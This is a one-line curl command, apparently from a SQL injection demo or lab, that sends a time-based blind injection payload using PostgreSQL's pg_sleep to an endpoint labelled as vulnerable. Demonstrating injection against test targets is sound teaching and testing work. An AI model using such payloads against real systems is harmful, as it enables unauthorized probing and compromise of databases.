curl $URL/sqli/vulnerable/time-based/books \
  --header "Content-Type: application/json" \
  --request GET \
  -G --data-urlencode "author=' OR EXISTS(SELECT 1 FROM pg_sleep(5))--" \
  -s | jq